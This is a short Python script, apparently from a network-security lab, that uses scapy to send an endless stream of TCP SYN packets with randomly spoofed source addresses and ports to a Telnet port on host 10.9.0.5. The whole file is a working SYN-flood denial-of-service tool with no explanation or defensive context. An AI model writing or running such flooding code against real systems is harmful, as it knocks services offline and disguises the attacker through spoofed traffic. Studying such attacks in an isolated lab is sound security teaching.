from scapy.all import *
import random
from multiprocessing.pool import ThreadPool

def main():
    while True: #Single function sends SYN packets
        ip_num_1 = random.randint(1,255)
        ip_num_2 = random.randint(1,255)
        ip_num_3 = random.randint(1,255)
        ip_num_4 = random.randint(1,255) #Four-bit Random IP Segment
        sport = random.randint(1024,65535) #Source Random Port
        src_ip = "%d.%d.%d.%d"%(ip_num_1,ip_num_2,ip_num_3,ip_num_4)
        ip= IP(dst="10.9.0.5",src=src_ip)
        tcp = TCP(dport=23,sport=sport,flags="S")
        pkt = ip / tcp
		#Built TCP Handshake Packet
        send(pkt, iface = 'br-445c467e3177', verbose=0)
        #Send to target host
   
if __name__ == '__main__':
    main()